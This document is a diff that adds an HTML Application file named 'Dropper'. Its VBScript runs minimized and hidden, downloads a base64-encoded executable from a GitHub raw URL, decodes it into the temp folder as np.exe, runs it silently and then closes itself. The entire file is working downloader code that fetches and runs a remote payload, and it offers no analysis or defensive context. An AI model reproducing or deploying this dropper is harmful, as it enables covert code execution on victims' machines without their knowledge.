@@ -1,0 +1,45 @@
+<html>
+<head>
+<HTA:APPLICATION ID="x" APPLICATIONNAME="Dropper" BORDER="thin" BORDERSTYLE="normal" CAPTION="no" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" SYSMENU="no" WINDOWSTATE="minimize">
+<script language="VBScript">
+
+Dim http, b64, stream, fso, exePath, shell
+exePath = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\np.exe"
+
+' Download Base64
+Set http = CreateObject("Microsoft.XMLHTTP")
+http.Open "GET", "https://raw.githubusercontent.com/vineetrajput141/nopowershell/refs/heads/main/NoPowerShell.b64", False
+http.Send
+
+If http.Status = 200 Then
+    b64 = http.responseText
+
+    ' Decode Base64
+    Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 1
+    stream.Open
+    stream.Write DecodeBase64ToBytes(b64)
+    stream.SaveToFile exePath, 2
+    stream.Close
+
+    ' Execute
+    Set shell = CreateObject("WScript.Shell")
+    shell.Run """" & exePath & """", 0, False
+End If
+
+self.close
+
+' Base64 decode function
+Function DecodeBase64ToBytes(base64)
+    Dim xml, node
+    Set xml = CreateObject("Microsoft.XMLDOM")
+    Set node = xml.createElement("b64")
+    node.dataType = "bin.base64"
+    node.text = base64
+    DecodeBase64ToBytes = node.nodeTypedValue
+End Function
+
+</script>
+</head>
+<body></body>
+</html>
